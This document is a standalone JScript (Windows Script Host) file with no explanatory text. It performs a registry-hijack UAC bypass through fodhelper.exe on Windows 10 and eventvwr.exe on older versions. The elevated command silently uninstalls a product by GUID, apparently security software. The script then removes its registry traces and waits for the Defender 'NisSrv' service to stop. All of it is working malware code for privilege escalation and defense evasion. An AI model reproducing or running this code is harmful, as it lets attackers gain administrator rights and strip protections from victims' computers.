function isServiceRunning(serviceName) {
    var serviceQuery = GetObject("winmgmts:").ExecQuery(
        "SELECT * FROM Win32_Service WHERE Name=" + serviceName
    );
    var enumerator = new Enumerator(serviceQuery);
    var service = enumerator.item();
    var state = "";
    try {
        state = service.State;
    } catch (e) {}
    if (state == "Running") {
        return true;
    } else {
        return false;
    }
}

var targetServiceName = "NisSrv";
var shellApp = WScript.CreateObject("shell.application");
var wshShell = new ActiveXObject("WScript.Shell");
var wmiService = GetObject("winmgmts:\\.\root\CIMV2");
var osQuery = wmiService.ExecQuery(
    "SELECT * FROM Win32_OperatingSystem",
    "WQL",
    48
);
var osEnumerator = new Enumerator(osQuery);
var operatingSystem = osEnumerator.item();
var systemDirectory = operatingSystem.SystemDirectory;
var version = operatingSystem.Version;
var versionArray = version.split(".");
if (versionArray[0] == "10") {
    wshShell.RegWrite(
        "HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command\",
        "MsiExec.exe /X{2AA3C13E-0531-41B8-AE48-AE28C940A809} ACCEPT=YES /qr+ /quiet",
        "REG_SZ"
    );
    wshShell.RegWrite(
        "HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command\DelegateExecute",
        "",
        "REG_SZ"
    );
    shellApp.ShellExecute(
        "explorer.exe",
        systemDirectory + "\fodhelper.exe",
        "",
        "open",
        0
    );
    WScript.sleep(1e4);
    wshShell.RegDelete(
        "HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command\"
    );
} else {
    if (versionArray[0] == "6") {
        wshShell.RegWrite(
            "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command\",
            "MsiExec.exe /X{2AA3C13E-0531-41B8-AE48-AE28C940A809} ACCEPT=YES /qr+ /quiet",
            "REG_SZ"
        );
        shellApp.ShellExecute(
            "explorer.exe",
            systemDirectory + "\eventvwr.exe",
            "",
            "open",
            0
        );
        WScript.sleep(1e4);
        wshShell.RegDelete(
            "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command\"
        );
    }
}

var loopCounter = 0;
while (true) {
    if (isServiceRunning(targetServiceName)) {
        WScript.sleep(100);
    } else {
        break;
    }
    loopCounter = loopCounter + 1;
    if (loopCounter == 900) {
        break;
    }
}
